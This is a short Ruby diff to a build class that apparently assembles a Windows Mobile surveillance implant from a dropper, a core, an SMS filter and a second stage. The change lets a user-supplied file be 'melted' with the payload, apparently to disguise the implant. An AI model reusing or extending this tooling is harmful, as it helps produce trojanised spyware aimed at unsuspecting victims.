@@ -46,6 +46,12 @@ class BuildWinMo < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
+    # use the user-provided file to melt with,
+    # but the actual melt will be performed later in the pack method
+    if params['input']
+      FileUtils.mv File.join(Dir.tmpdir, params['input']), path('user')
+    end
+
     CrossPlatform.exec path('dropper'), path('core')+' '+
                                         path('smsfilter')+' '+
                                         path('secondstage')+' '+
